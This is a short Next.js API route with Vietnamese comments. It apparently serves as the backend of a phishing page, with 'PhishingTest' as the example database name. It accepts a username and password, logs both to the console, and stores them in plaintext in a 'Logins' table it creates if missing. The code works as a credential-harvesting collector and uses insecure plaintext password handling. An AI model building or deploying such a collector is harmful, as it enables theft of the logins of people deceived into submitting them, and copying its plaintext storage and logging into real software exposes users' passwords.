import { NextResponse } from 'next/server';
import sql from 'mssql';

// 📌 Cấu hình kết nối SQL Server
const config: sql.config = {
  server: process.env.DB_SERVER!,         // Ví dụ: 'localhost'
  database: process.env.DB_DATABASE!,     // Ví dụ: 'PhishingTest'
  user: process.env.DB_USER!,             // Ví dụ: 'sa' hoặc 'Truong'
  password: process.env.DB_PASSWORD!,     // Mật khẩu tài khoản SQL
  options: {
    encrypt: true,                        // Giữ nguyên nếu dùng SQL Server
    trustServerCertificate: true,         // Cho phép tự ký SSL
  },
};

export async function POST(req: Request) {
  try {
    // 📥 Lấy dữ liệu từ request
    const { username, password } = await req.json();

    console.log('🟢 Dữ liệu nhận:', { username, password });

    // 🧩 Kết nối tới database
    const pool = await sql.connect(config);
    console.log('✅ Kết nối database thành công');

    // ✅ Tạo bảng nếu chưa có (tùy chọn, có thể bỏ nếu chắc chắn bảng tồn tại)
    await pool.request().query(`
      IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='Logins' AND xtype='U')
      CREATE TABLE Logins (
        id INT IDENTITY(1,1) PRIMARY KEY,
        username NVARCHAR(255),
        password NVARCHAR(255),
        created_at DATETIME DEFAULT GETDATE()
      )
    `);

    // ✍️ Ghi dữ liệu vào bảng Logins
    await pool
      .request()
      .input('username', sql.NVarChar, username)
      .input('password', sql.NVarChar, password)
      .query('INSERT INTO Logins (username, password) VALUES (@username, @password)');

    console.log('✅ Lưu thành công');
    return NextResponse.json({ message: 'Success' }, { status: 200 });

  } catch (error) {
    console.error('❌ Lỗi ghi vào DB:', error);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}
